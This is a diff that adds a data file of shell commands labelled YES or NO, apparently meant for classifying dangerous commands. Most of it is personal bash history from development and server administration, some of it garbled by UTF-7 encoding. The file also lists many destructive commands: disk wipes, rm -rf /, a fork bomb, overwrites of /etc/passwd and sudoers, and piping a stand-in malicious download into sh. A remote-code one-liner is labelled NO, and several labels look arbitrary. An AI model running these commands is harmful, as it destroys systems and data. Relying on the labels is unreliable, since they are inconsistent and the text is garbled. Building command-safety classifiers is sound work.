@@ -1,0 +1,837 @@
+cat /sys/bus/usb/devices/usb1/power/control                    NO
+cat /sys/bus/usb/devices/usb1/power/runtime_status                    NO
+cat /sys/bus/usb/devices/usb2/power/runtime_status                    NO
+cat /sys/bus/usb/devices/usb3/power/runtime_status                    NO
+cat /sys/bus/usb/devices/usb4/power/runtime_status                    NO
+./matlab                     NO
+apt search ptyxis                   NO
+bash -c  "$(wget -qO- https://git.io/vQgMr)"                  NO
+cat .history                    NO
+cat /sys/bus/usb/devices/usb2/power/runtime_                    NO
+cat /sys/bus/usb/devices/usb2/power/runtime_status                    NO
+cat bad_commands.sh                    NO
+cat bad_commands.sh                    NO
+cat commands.sh                    NO
+cat my-hist.sh | sort | uniq                NO
+cat my-hist.sh | sort | uniq > my-hist.sh              NO
+cat my-hist.sh | uniq                  NO
+cd ..                    NO
+cd /media/catalin/                    NO
+cd 5C2C577E2C57525E/                    NO
+cd Controllers/                    NO
+cd Do                    NO
+cd Documents/                    NO
+cd Downloads/                    NO
+cd MATLAB/bin/                    NO
+cd Migrations/                    NO
+cd OnlineEbookReader.Server/                    NO
+cd OnlineEbookReader/                    NO
+cd Projects/                    NO
+cd Projects/bad-shell/                    NO
+cd User/source/                    NO
+cd Users/                    NO
+cd bad-shell/                    NO
+cd onlineebookreader.client/                    NO
+cd repo                    NO
+cd repos                    NO
+cd repos/                    NO
+cd repos/OnlineEbookReader/                    NO
+cd uploads/                    NO
+cd wwwroot/                    NO
+clear                     NO
+cp ~/.bash_history my-hist.sh                   NO
+curl --insecure -X 'GET'   'https://localhost:5108/Books/search'   -H 'accept: text/plain'   -H 'Content-Type: application/json'   -d "'""string""'" NO
+curl --insecure -X 'GET'   'https://localhost:55942/Books/search'   -H 'accept: text/plain'   -H 'Content-Type: application/json'   -d "'""string""'" NO
+curl --insecure -X 'GET'   'https://localhost:55942/WeatherForecast'   -H 'accept: application/json'          NO
+curl --insecure -X 'POST'   'https://localhost:7291/Books/UploadBook'   -H 'accept: */*'   -H 'Content-Type: multipart/form-data'   -F 'file=@django5.epub;type=application/epub+zip' NO
+curl --insecure https://localhost:55942/Books                   NO
+curl --insecure https://localhost:7291/Books                   NO
+curl --insecure https://localhost:7291/books                   NO
+curl -X 'GET'   'http://localhost:510/Books/search?searchParam=fooo'   -H 'accept: text/plain'           NO
+curl -X 'GET'   'http://localhost:5108/Books/search?searchParam=fooo'   -H 'accept: text/plain'           NO
+curl -X 'GET'   'http://localhost:55942/WeatherForecast'   -H 'accept: application/json'           NO
+curl -X 'GET'   'https://localhost:5108/Books/search'   -H 'accept: text/plain'   -H 'Content-Type: application/json'   -d "'""string""'"  NO
+curl -X 'GET'   'https://localhost:55942/Books'   --insecure             NO
+curl -X 'GET'   'https://localhost:55942/Books'   -H 'accept: application/json' --insecure          NO
+curl -X 'GET'   'https://localhost:55942/Books'   -H 'accept: text/plain' --insecure          NO
+curl -X 'GET'   'https://localhost:55942/Books/search?searchParam=fooo'   -H 'accept: text/plain'           NO
+curl -X 'GET'   'https://localhost:55942/Books/search?searchParam=fooo'   -H 'accept: text/plain' --insecure          NO
+curl -X 'GET'   'https://localhost:55942/WeatherForecast'   -H 'accept: application/json'           NO
+curl -X 'GET'   'https://localhost:7291/Books/search?searchParam=fooo'   -H 'accept: text/plain' --insecure          NO
+curl -X 'POST'   'https://localhost:55942/Books/UploadBook'   -H 'accept: */*'   -H 'Content-Type: multipart/form-data'   -F 'file=@django5.epub;type=application/epub+zip'  NO
+curl -X 'POST'   'https://localhost:55942/Books/UploadBook'   -H 'accept: */*'   -H 'Content-Type: multipart/form-data'   -F 'file=@django5.epub;type=application/epub+zip' --insecure NO
+curl -X 'POST'   'https://localhost:7291/Books/UploadBook'   -H 'accept: */*'   -H 'Content-Type: multipart/form-data'   -F 'file=@django5.epub;type=application/epub+zip'  NO
+curl -k -X 'GET'   'https://localhost:55942/WeatherForecast'   -H 'accept: application/json'          NO
+curl -k -X 'GET'   'https://localhost:55942/books'   -H 'accept: application/json'          NO
+dmesg | grep usb                  NO
+dotnet run                    NO
+echo on >  /sys/bus/usb/devices/usb1/power/control                 NO
+echo $HISTFILE                    NO
+gemini                     NO
+git clone git@github.com:brownbishop/OnlineEbookReader.git                   NO
+git restore Program.cs                   NO
+history                     NO
+ls;                     NO
+man man                    NO
+mkdir bad-shell                    NO
+npm run dev                   NO
+npm run dve                   NO
+nvim .bash_history                    NO
+nvim .bash_history-*tmp                    NO
+nvim .bash_history-21916.tmp                    NO
+nvim .bash_history-53680.tmp                    NO
+nvim BooksController.cs                    NO
+nvim Controllers/                    NO
+nvim Controllers/BooksController.cs                    NO
+nvim OnlineEbookReader.Server.csproj                    NO
+nvim Pro                    NO
+nvim Program.cs                    NO
+nvim bad_commands.sh                    NO
+nvim bad_commands.sh                    NO
+nvim commands.sh                    NO
+nvim commands.sh                    NO
+nvim commands2.sh                    NO
+nvim my-hist.sh                    NO
+nvim my-hist.sh                    NO
+nvim onlineebookreader.client/                    NO
+nvim repos/OnlineEbookReader/OnlineEbookReader.Server/Controllers/BooksController.cs                    NO
+ping google.com                    NO
+ptyxis                     NO
+rm -fr OnlineEbookReader/                   NO
+sort commands.sh                    NO
+sort commands.sh > commands2.sh                  NO
+sudo apt install ./Insomnia.Core-11.6.1.deb                  YES
+sudo apt install ptyxis                  YES
+sudo apt update && sudo apt upgrade               YES
+sudo dmesg | grep usb                 YES
+sudo echo on >  "/sys/bus/usb/devices/usb1/power/control
+sudo echo ""on" >  /sys/bus/usb/devices/usb1/power/control             YES
+sudo su                    YES
+systemctl poweroff                    YES
+vim                     YES
+rm -rf /                   YES
+rm -rf *                   YES
+rm -rf .                   YES
+rm -rf some_directory/ *                  YES
+dd if=/dev/zero of=/dev/sda                   YES
+mkfs.ext4 /dev/sda                    YES
+command > /dev/sda                   YES
+mv directory /dev/null                   YES
+:(){ :|:& };:                   YES
+kill -9 -1                   YES
+shutdown now                    YES
+reboot                     YES
+chmod -R 777 /                  YES
+wget http://malicious_source -O- | sh                 YES
+curl http://malicious_source | sh                  YES
+echo some_content > /etc/passwd                  YES
+history | sh                   YES
+crontab -r                    YES
+find / -name something -delete                 YES
+set -o noclobber                   YES
+dd if=/dev/random of=/dev/sda                   YES
+cat /dev/zero > /dev/sda                  YES
+mkfs.xfs /dev/sda                    YES
+mkfs.btrfs /dev/sda                    YES
+fdisk /dev/sda                    YES
+gdisk /dev/sda                    YES
+parted /dev/sda                    YES
+cfdisk /dev/sda                    YES
+shred /dev/sda                    YES
+wipefs -a /dev/sda                   YES
+badblocks -w /dev/sda                   YES
+hdparm --write-sector 0 /dev/sda                  YES
+sg_format --format /dev/sda                   YES
+nvme format /dev/nvme0n1                   YES
+dd if=/dev/urandom of=/dev/kmem                   YES
+echo c > /proc/sysrq-trigger                  YES
+echo b > /proc/sysrq-trigger                  YES
+echo o > /proc/sysrq-trigger                  YES
+echo s > /proc/sysrq-trigger                  YES
+echo u > /proc/sysrq-trigger                  YES
+echo 1 > /proc/sys/kernel/panic                  YES
+cat /dev/urandom > /dev/port                  YES
+cat /dev/mem > /dev/port                  YES
+cat /dev/kmem > /dev/port                  YES
+dd if=/dev/mem of=/dev/null                   YES
+dd if=/dev/kmem of=/dev/null                   YES
+dd if=/dev/port of=/dev/null                   YES
+dd if=/dev/zero of=/dev/mem                   YES
+dd if=/dev/zero of=/dev/kmem                   YES
+dd if=/dev/zero of=/dev/port                   YES
+dd if=/dev/random of=/dev/mem                   YES
+dd if=/dev/random of=/dev/kmem                   YES
+dd if=/dev/random of=/dev/port                   YES
+dd if=/dev/urandom of=/dev/mem                   YES
+dd if=/dev/urandom of=/dev/kmem                   YES
+dd if=/dev/urandom of=/dev/port                   YES
+dd if=/dev/zero of=/boot/vmlinuz                   YES
+dd if=/dev/random of=/boot/vmlinuz                   YES
+dd if=/dev/urandom of=/boot/vmlinuz                   YES
+dd if=/dev/zero of=/lib/modules/$(uname -r)                  YES
+dd if=/dev/random of=/lib/modules/$(uname -r)                  YES
+dd if=/dev/urandom of=/lib/modules/$(uname -r)                  YES
+rm -rf /boot                   YES
+rm -rf /etc                   YES
+rm -rf /lib                   YES
+rm -rf /usr                   YES
+rm -rf /var                   YES
+rm -rf /bin                   YES
+rm -rf /sbin                   YES
+rm -rf /home                   YES
+find / -type f -exec shred {} \;              YES
+find / -type f -exec rm {} \;              YES
+find / -type d -exec rm -r {} \;             YES
+find / -type f -delete                 YES
+find / -type d -delete                 YES
+find / -perm 777 -exec rm -r {} \;             YES
+find / -perm 666 -exec rm -r {} \;             YES
+find / -perm 444 -exec rm -r {} \;             YES
+find / -name .* -exec rm -r {} \;             YES
+find / -name * -exec rm -r {} \;             YES
+chown root:root /                   YES
+chown -R root:root /                  YES
+chmod 0 /                   YES
+chmod -R 0 /                  YES
+chmod 666 /etc/shadow                   YES
+chmod 666 /etc/passwd                   YES
+chmod 777 /etc/sudoers                   YES
+echo  > /etc/sudoers                  YES
+echo root::0:0:root:/root:/bin/bash > /etc/passwd                  YES
+echo root::: > /etc/shadow                  YES
+command                     YES
+apt                     YES
+ubuntu+AC0-drivers                     YES
+apt  nvidia+AC0-415                   NO
+nvidia+AC0-smi                     YES
+reboot                     YES
+systemctl  network+AC0-manager                   NO
+lspci  grep network                  NO
+lspci  grep Network                  NO
+lspci                     NO
+lshw  network                   NO
+lsmod                     NO
+modprobe iwlwifi                    YES
+systemctl restart network+AC0-manager                   YES
+rfkill list all                   YES
+cat /etc/network/interfaces                    NO
+mod                     NO
+modinfo iwlwifi +AHw- grep 3165                 NO
+modinfo iwlwifi                    NO
+modinfo iwlwifi +AHw- grep 3165                 NO
+lshw +AC0-class network                   NO
+nvidia+AC0-smi                     NO
+mod                     NO
+lspci +AHw- grep Network                  YES
+cat /etc/network/interfaces                    NO
+lspci                     NO
+lspci +AC0-v                    YES
+modinfo alx                    YES
+apt install linux+AC0-generic+AC0-hwe+AC0-16.04                   YES
+echo 1969 e0b1 +AHw- sudo tee /sys/bus/pci/drivers/alx/new+AF8-id               YES
+cat /sys/bus/pci/drivers/alx/new+AF8-id                    YES
+uname +AC0-a                    YES
+apt update                    YES
+apt upgrade                    YES
+apt search linux                   YES
+apt search linux+AC0-kernel                   YES
+apt search linux+AC0-kernel                   YES
+apt info linux                   YES
+apt show linux                   YES
+apt search li                   YES
+apt search linux+AC0-gener                   YES
+apt show                    YES
+apt install linux+AC0-generic                   NO
+reboot                     NO
+lshw +AC0-class network                   NO
+nvidia+AC0-smi                     YES
+apt update                    YES
+apt upgrade                    YES
+apt update                    YES
+apt+AC0-get install default+AC0-jdk +AC0-y                  YES
+apt+AC0-get install default+AC0-jdk +AC0-                  YES
+apt+AC0-get install default+AC0-jdk                   YES
+apt+AC0-get install default+AC0-jdk +AC0-y                  YES
+mkdir /var/www/html/test+AF8-project                    NO
+pwd                     NO
+ll                     NO
+cd ..                    NO
+ll                     YES
+chmod +AC0-R 777 html                  NO
+ll                     YES
+apt install phpmyadmin +AC0-y                  YES
+systemctl restart apache2                   NO
+ipconfig                     NO
+ifconfig                     NO
+locate phpmyadmin                    NO
+updatedb                     NO
+locate phpmyadmin                    YES
+cat /etc/apache2/conf+AC0-enabled/phpmyadmin.conf                    NO
+php +AC0-m +AHw- grep mysql                 NO
+php +AC0-v                    YES
+systemctl restart apache2                   YES
+systemctl restart mysql                   NO
+vim                     YES
+apt install vim                   YES
+vim /etc/apache2/apache2.conf                    YES
+systemctl restart mysql                   YES
+systemctl restart apache2                   YES
+vim /etc/apache2/apache2.conf                    NO
+exit                     YES
+apt+AC0-get install default+AC0-jre                   NO
+exit                     YES
+systemctl restart apache2                   YES
+vim .htaccess                    YES
+systemctl restart apache2                   NO
+ll                     YES
+rm .htaccess                    NO
+exit                     NO
+host metropolegitimkurumlari.com                    YES
+ssh root+AEA-77.223.129.127                    YES
+ssh root+AEA-77.223.129.127 1366                   YES
+ssh root+AEA-77.223.129.127                    YES
+ssh root+AEA-77.223.129.127 +AC0-p1366                   NO
+host ordekor.com                    NO
+whois ordekor.com                    YES
+apt install whois                   NO
+whois ordekor.com                    NO
+whois oguzkaraman.com                    NO
+aptupdate                     NO
+apt update                    NO
+apt update update +AC0-y                  NO
+apt update +AC0-y                   YES
+apt install apache2 +AC0-y                  YES
+systemctl start apache2                   YES
+apt install mysql+AC0-server                   NO
+/usr/bin/mysql+AF8-secure+AF8-installation                     YES
+apy install php                   YES
+apt install php                   NO
+tail +AC0-f /var/log/apache2/error.log                   YES
+apt install sublime                   YES
+apt install sublime+AC0-text                   YES
+apt search sublime                   NO
+./sublime.py                     YES
+chmod a+-x sublime.py                   NO
+./sublime.py                     NO
+./sublime+AF8-text                     NO
+exit                     NO
+tail +AC0-f /var/log/apache2/error.log                   YES
+systemctl apache2 restart                   YES
+systemctl restart apache2                   NO
+tail +AC0-f /var/log/apache2/error.log                   NO
+teamviewer +ACY-                    NO
+exit                     YES
+apt install filezilla                   NO
+filezilla                     NO
+tail +AC0-f /var/log/apache2/error.log                   YES
+systemctl apache2 restart                   YES
+systemctl restart apache2                   NO
+exit                     NO
+tail +AC0-f /var/log/apache2/error.log                   NO
+cd Desktop/                    NO
+ll                     NO
+cd sublime+AF8-text+AF8-3                    NO
+ll                     NO
+./sublime.py                     NO
+./sublime+AF8-text                     YES
+ssh +AC0-i id+AF8-rsa+AF8-4096+AF8-fa+AF8-ayder root+AEA-134.209.251.194                  YES
+cd /etc/host                    YES
+cd /etc/hosts                    YES
+cd /etc/hosts/                    YES
+vim /etc/hosts/                    YES
+apt install docker                   NO
+docker                     YES
+apt install docker                   YES
+curl +AC0-fsSL https://download.docker.com/linux/ubuntu/gpg +AHw- sudo apt+AC0-key add +AC0-              YES
+apt install curl                   YES
+curl +AC0-fsSL https://download.docker.com/linux/ubuntu/gpg +AHw- sudo apt+AC0-key add +AC0-              YES
+apt+AC0-get update                    NO
+apt+AC0-cache policy docker+AC0-ce                   NO
+apt+AC0-get install +AC0-y docker+AC0-ce                  YES
+systemctl status docker                   NO
+git clone git+AEA-github.com:aoozdemir/husky.git                   YES
+git clone furkanaytac06+AEA-github.com:aoozdemir/husky.git                   YES
+git clone https://furkanaytac06+AEA-github.com:aoozdemir/husky.git                   YES
+git clone https://git+AEA-github.com:aoozdemir/husky.git                   YES
+git clone .com:aoozdemir/husky.git                   YES
+git clone https://github.com/aoozdemir/husky.git                   YES
+ll                     NO
+cd husky/                    NO
+ll                     NO
+docker+AC0-compose up                    NO
+apt install docker+AC0-compose                   YES
+docker+AC0-compose up                    NO
+docker+AC0-compose +AC0-version                    NO
+docker+AC0-compose update                    NO
+apt remove docker+AC0-compose                   YES
+pip install docker+AC0-compose                   YES
+apt install python+AC0-pip                   YES
+docker+AC0-compose +AC0-version                    NO
+docker+AC0-compose up                    NO
+ll                     NO
+pip install docker+AC0-compose                   YES
+pip install +AC0ALQ-upgrade pip                  YES
+docker+AC0-compose +AC0-version                    NO
+docker+AC0-compose up                    NO
+apt remove docker+AC0-compose                   YES
+sudo chmod +-x /usr/local/bin/docker+AC0-compose                  YES
+docker+AC0-compose +AC0ALQ-version                    NO
+docker+AC0-compose                     NO
+cd /usr/local/bin                    YES
+ll                     NO
+./docker+AC0-compose                     NO
+./docker+AC0-compose +AC0-version                    NO
+docker+AC0-compose                     NO
+cd +AC0-                    NO
+bash /usr/bin/docker+AC0-compose                    NO
+bash /usr/local/bin/docker+AC0-compose                    NO
+./usr/local/bin/docker+AC0-compose                     NO
+docker+AC0-compose                     NO
+cp /usr/local/bin/docker+AC0-compose /usr/bin/                   YES
+docker+AC0-compose                     NO
+docker+AC0-compose +AC0-version                    NO
+docker+AC0-compose up                    NO
+tail +AC0-f /var/log/apache2/error.log                   NO
+apt install php5+AC0-curl                   YES
+apt install php+AC0-curl                   YES
+tail +AC0-f /var/log/apache2/error.log                   NO
+systemctl apache2 restart                   NO
+systemctl restart apache2                   YES
+tail +AC0-f /var/log/apache2/error.log                   NO
+php +AC0-                    NO
+php +AC0-V                    NO
+php +AC0-v                    NO
+tail +AC0-f /var/log/apache2/error.log                   NO
+apt install conda                   YES
+sky                     NO
+skype                     NO
+sudo add+AC0-apt+AC0-repository +ACI-deb http://archive.canonical.com/ +ACQ-(lsb+AF8-release +AC0-sc) partner+ACI-               YES
+sudo apt+AC0-get update +ACYAJg- sudo apt+AC0-get install skype              YES
+history +AHw- grep 134                  NO
+ssh +AC0-i id+AF8-rsa+AF8-4096+AF8-fa+AF8-ayder root+AEA-134.209.251.194                  YES
+cd Desktop/                    NO
+ssh +AC0-i id+AF8-rsa+AF8-4096+AF8-fa+AF8-ayder root+AEA-134.209.251.194                  YES
+tail +AC0-f /var/log/apache2/error.log                   NO
+tcpdump +AC0-anlp                    NO
+tcpdump +AC0-anlp 'port 80'                  NO
+apt install wireshark                   YES
+wireshark +ACY-                    NO
+python AutoEncoder.py cat1.png                   NO
+python import matplotlib                   NO
+python +AC0-c +ACI-from pylab import +ACoAOw- plot()+ADs- show()+ACI- +AC0ALQ-verbose+AC0-helpful             NO
+python +AC0-mpip install matplotlib                  YES
+clear                     NO
+pip install matplotlib                   YES
+python +AC0-m easy+AF8-install +AC0ALQ-upgrade pyOpenSSL                 YES
+pip install matplotlib                   YES
+python AutoEncoder.py cat1.png                   YES
+pip install matplotlib                   YES
+pip install +AC0ALQ-upgrade pip                  YES
+pip install matplotlib                   YES
+python AutoEncoder.py cat1.png                   NO
+pip install matplotlib                   YES
+pip uninstall matplotlib                   YES
+hash +AC0-d pip                   NO
+pip install matplotlib                   YES
+python AutoEncoder.py cat1.png                   NO
+apt install python+AC0-tk                   YES
+python AutoEncoder.py cat1.png                   NO
+tensorflow                     NO
+pip                     NO
+pip3                     NO
+pip show tensorflow                   YES
+pip install tensorflow                   NO
+python AutoEncoder.py cat1.png                   NO
+pip show tensorflow                   NO
+pip install tensorflow                   YES
+pip show tensorflow                   NO
+python AutoEncoder.py cat1.png                   NO
+nvidia+AC0-smi                     NO
+apt+AC0-get remove +AC0ALQ-auto+AC0-remove python+AC0-enum34                  YES
+python AutoEncoder.py cat1.png                   NO
+nvidia+AC0-smipip import python+AC0-six                   NO
+pip import python+AC0-six                   NO
+pip install python+AC0-six                   YES
+pip install six                   YES
+python AutoEncoder.py cat1.png                   NO
+pip install tensorflow                   YES
+python AutoEncoder.py cat1.png                   NO
+pip install yaml                   YES
+pip install python+AC0-yaml                   YES
+pip install pyyaml                   YES
+python AutoEncoder.py cat1.png                   NO
+pip install scipu                   YES
+pip install scipy                   NO
+python AutoEncoder.py cat1.png                   NO
+grep +AC0-rl +ACI-toronto+ACI- .                  NO
+grep +ACI-toronto+ACI- .                   NO
+grep +ACI-toronto+ACI-                    NO
+ll                     NO
+vim autoencoder+AF8-classification.h5                    YES
+vim AutoEncoder.py                    YES
+python AutoEncoder.py cat1.png                   NO
+vim AutoEncoder.py                    YES
+python AutoEncoder.py cat1.png                   YES
+toor                     NO
+python setup.py                    YES
+python setup.py install                   YES
+python AutoEncoder.py airplane1.png                   NO
+clear                     NO
+python AutoEncoder.py airplane1.png                   NO
+python LSTM.py airplane1.png                   NO
+pip install cv2                   YES
+pip install opencv+AC0-python                   YES
+python LSTM.py airplane1.png                   NO
+sudo apt+AC0-get update                   NO
+sudo apt+AC0-get install virtualbox+AC0-5.2                  YES
+virtualbox                     NO
+toor                     NO
+python3 AutoEncoder.py airplane1.png                   NO
+virtualbox                     NO
+poweroff                     NO
+apt update                    NO
+apt install php7.2 php7.2+AC0-common php7.2+AC0-cli php7.2+AC0-fpm                YES
+php +AC0-v                    NO
+locate php                    NO
+sudo add+AC0-apt+AC0-repository universe                   YES
+sudo add+AC0-apt+AC0-repository +ACI-deb http://archive.ubuntu.com/ubuntu +ACQ-(lsb+AF8-release +AC0-sc) universe+ACI-               YES
+sudo apt+AC0-get update                   NO
+systemctl apache2 restart                   YES
+systemctl restart apache2                   YES
+apt+AC0-get install php7.2+AC0-mbstring                   YES
+apt+AC0-get install php+AC0-curl                   YES
+systemctl restart apache2                   YES
+apt+AC0-get install ext+AC0-curl                   YES
+apt install php7.2+AC0-curl                   YES
+systemctl restart apache2                   YES
+apt install ext+AC0-dom                   YES
+apt install php7.0+AC0-xml                   YES
+apt install php7.2+AC0-xml                   YES
+cd ..                    NO
+cd git                    NO
+cd ..                    NO
+ls                     NO
+home                     NO
+cd home/afatek/git/rottweiler/                    NO
+ls                     NO
+npm i                    NO
+npm install                    YES
+apt install npm                   YES
+composer install                    YES
+apt install composer                   YES
+composer                     NO
+composer install                    YES
+composer update                    YES
+php artisan key:generate                   YES
+php artisan serve                   YES
+composer dump+AC0-auto                    NO
+php artisan serve                   NO
+php artisan config:clear                   NO
+php artisan config:cache                   NO
+php artisan serve                   NO
+php artisan config:clear                   NO
+php artisan config:cache                   NO
+php artisan serve                   NO
+php artisanserve                    YES
+php artisan serve                   YES
+history +AHw- grep artisan                  NO
+php artisan serve                   NO
+php +AC0-f test.php +AD4- result+AF8-final.txt                 NO
+ll                     NO
+vim result+AF8-final.txt                    NO
+php +AC0-f test.php +AD4- result+AF8-final.txt                 YES
+vim result+AF8-final.txt                    NO
+ll                     NO
+php +AC0-f test.php                   YES
+clear                     NO
+php +AC0-f test.php                   YES
+clear                     NO
+php +AC0-f test.php                   NO
+virtualbox                     NO
+rm +AC0-R                    YES
+ll                     NO
+vim results                    NO
+rm results                    YES
+ll                     NO
+vim results                    NO
+rm +AC0-Rf                    YES
+vim results                    NO
+vim google+AF8-vision.json                    NO
+rm google+AF8-vision.json                    YES
+vim google+AF8-vision.json                    NO
+vim google+AF8-vision.json                    NO
+vim results                    NO
+rm +AC0-R                    NO
+rm +AC0-R                    YES
+php +AC0-f                    YES
+mkdir php+AF8-curl                    NO
+cd php+AF8-curl/                    YES
+ll                     NO
+vim test.php                    NO
+php +AC0-f test.php                   NO
+curl +AC0-h                    YES
+curl +AC0-h +AHw- grep +AC0-d                 NO
+curl +AC0-h +AHw- grep '+AC0-d'                 NO
+curl +AC0-h +AHw- grep 'd'                 NO
+clear                     NO
+ll                     NO
+vim test.php                    NO
+php +AC0-f test.php                   YES
+vim test.php                    NO
+php +AC0-f test.php                   NO
+vim test.php                    YES
+mkdir /var/www/html/test+AF8-sandbox                    NO
+cd /var/www/html/test+AF8-sandbox/                    YES
+ll                     NO
+vim parse.php                    NO
+cd +AC0-                    NO
+ll                     NO
+cp result+AF8-final.txt /var/www/html/test+AF8-sandbox/                   NO
+cd +AC0-                    YES
+ll                     NO
+vim parse.php                    NO
+rm parse.php                    YES
+cd +AC0-                    YES
+ll                     NO
+vim test.php                    NO
+php +AC0-f test.php                   NO
+vim test.php                    NO
+php +AC0-f test.php                   YES
+vim test.php                    NO
+php art                    NO
+php artisan serve                   YES
+apt install dirb                   NO
+tail +AC0-f /var/log/apache2/error.log                   YES
+virtualbox                     NO
+apt install keepassx                   NO
+keepassx                     YES
+tail +AC0-f /var/log/apache2/error.log                   NO
+systemctl apache2 status                   NO
+systemctl status apache2                   NO
+ll                     NO
+vim mockup.txt                    NO
+ll                     YES
+chmod +-x hplip+AC0-3.19.8.run                   NO
+./hplip+AC0-3.19.8.run                     YES
+tail +AC0-f /var/log/apache2/error.log                   YES
+tail +AC0-f /var/log/apache2/access.log                   NO
+tail +AC0-f /var/log/apache2/error.log                   NO
+exit                     NO
+tail +AC0-f /var/log/apache2/error.log                   NO
+chmod a+-x test+AF8-curl.sh                   NO
+cd Desktop/                    YES
+chmod a+-x test+AF8-curl.sh                   NO
+./test+AF8-curl.sh                     YES
+./test+AF8-curl.sh +AD4- tester.html                   YES
+rm test+AF8-curl.sh                    YES
+vim test+AF8-curl.sh                    YES
+chmod a+-x test+AF8-curl.sh                   YES
+./test+AF8-curl.sh +AD4- tester.html                   YES
+rm test+AF8-curl.sh                    YES
+vim test+AF8-curl.sh                    YES
+chmod a+-x test+AF8-curl.sh                   YES
+./test+AF8-curl.sh +AD4- tester.html                   YES
+rm +AC0-R                    NO
+rm +AC0-R                    YES
+cd program/                    YES
+ll                     NO
+chmod a+-x main.py                   NO
+python3 main.py                    YES
+python3 main.py                    YES
+apt+AC0-get install python3+AC0-bs4                   YES
+pip install beautifulsoup4                   YES
+python3 parser.py                    YES
+clear                     NO
+python3 parser.py                    NO
+python3 parser.py +AHw- grep yont                 YES
+python3 parser.py +AHw- grep +ACI-yont+ACI-                 YES
+python3 parser.py                    YES
+python3 parser.py +AHw- grep yont                 YES
+python3 parser.py +AHw- grep Zachary                 YES
+python3 parser.py                    YES
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+clear                     YES
+python3 parser.py                    NO
+tail +AC0-f /var/log/apache2/error.log                   YES
+systemctl apache2 restart                   NO
+systemctl restart apache2                   YES
+tail +AC0-f /var/log/apache2/error.log                   YES
+kill +AC0-9 4079                   NO
+top                     YES
+python3 download.py                    NO
+clear                     YES
+python3 download.py                    NO
+ll                     YES
+cd details/                    NO
+ll                     NO
+cd ..                    NO
+python3 download.py                    NO
+top                     YES
+python3 download.py                    NO
+rm +ACo-                    NO
+cd ..                    YES
+ll                     NO
+vim download.py                    NO
+python3 download.py                    NO
+rm +AC0-R                    NO
+python3 download.py                    YES
+clear                     YES
+python3 download.py                    NO
+clear                     YES
+python3 download.py                    NO
+clear                     YES
+python3 download.py                    NO
+clear                     YES
+python3 download.py                    NO
+clear                     YES
+python3 download.py                    NO
+clear                     YES
+python3 download.py                    NO
+clear                     YES
+python3 download.py                    NO
+clear                     YES
+python3 download.py                    NO
+clear                     YES
+ll                     NO
+python3 download.py                    NO
+clear                     NO
+python3 download.py                    NO
+clear                     NO
+python3 download.py                    NO
+python download.py                    YES
+clear                     YES
+python download.py                    NO
+clear                     YES
+python download.py                    NO
+tail +AC0-f /var/log/apache2/error.log                   YES
+clear                     NO
+python                     NO
+python3                     YES
+pip3 install BeautifulSoup                   YES
+pip install BeautifulSoup                   YES
+python3                     YES
+python                     YES
+cd Projects/                    YES
+ll                     NO
+cd S                    NO
+cd Saribulut/                    NO
+ll                     NO
+mkdir tracker                    NO
+cd tracker                    NO
+ll                     NO
+cd                     NO
+ll                     NO
+cd .                    NO
+cd +AC0-                    NO
+exit                     NO
+tail +AC0-f /var/log/apache2/error.log                   NO
+clear                     NO
+exit                     NO
+vim akakce.py                    NO
+python akakce.py                    YES
+pip install pand                   YES
+pip install panda                   YES
+python akakce.py                    YES
+pip install pandas                   YES
+python akakce.py                    YES
+pip install request                   YES
+python akakce.py                    YES
+pip install request                   YES
+pip install requests                   YES
+python akakce.py                    YES
+pip install python+AC0-requests                   YES
+apt install python+AC0-requests                   YES
+python akakce.py                    YES
+python3 akakce.py                    YES
+pip3 install pandas                   YES
+apt install python3+AC0-pip                   YES
+python3 akakce.py                    YES
+pip3 install pandas                   YES
+python3 akakce.py                    YES
+pip3 install +AC0ALQ-upgrade pip3                  YES
+pip install +AC0ALQ-upgrade pip                  YES
+pip3 install +AC0ALQ-upgrade pip3                  YES
+pip3 +AC0-v                    YES
+pip3 +AC0-V                    NO
+pip3 install +AC0ALQ-upgrade pip                  NO
+python3 akakce.py                    YES
+pip3 install +AC0ALQ-upgrade setuptools pip                 YES
+python3 akakce.py                    YES
+clear                     YES
+python3 akakce.py                    NO
+python akakce.py                    YES
+pip3 install request                   YES
+pip install request                   YES
+python akakce.py                    YES
+python tracker.py                    YES
+clear                     YES
+python tracker.py                    NO
+python akakce.py                    YES
+apt install python+AC0-requests                   YES
+apt install python3+AC0-requests                   YES
+pip install requests                   YES
+python akakce.py                    YES
+python3 akakce.py                    YES
+pip install requestspip3 install request                 YES
+pip3 install request                   YES
+python3 akakce.py                    YES
+pip3 install request                   YES
+pip3 install +AC0ALQ-upgrade setuptools                  YES
+pip3 install request                   NO
+python3 akakce.py                    YES
+python3 +AC0-V                    YES
+apt install python 3.7.4                  YES
+python +AC0-V                    NO
+python3 +AC0-V                    YES
+apt upgrade                    NO
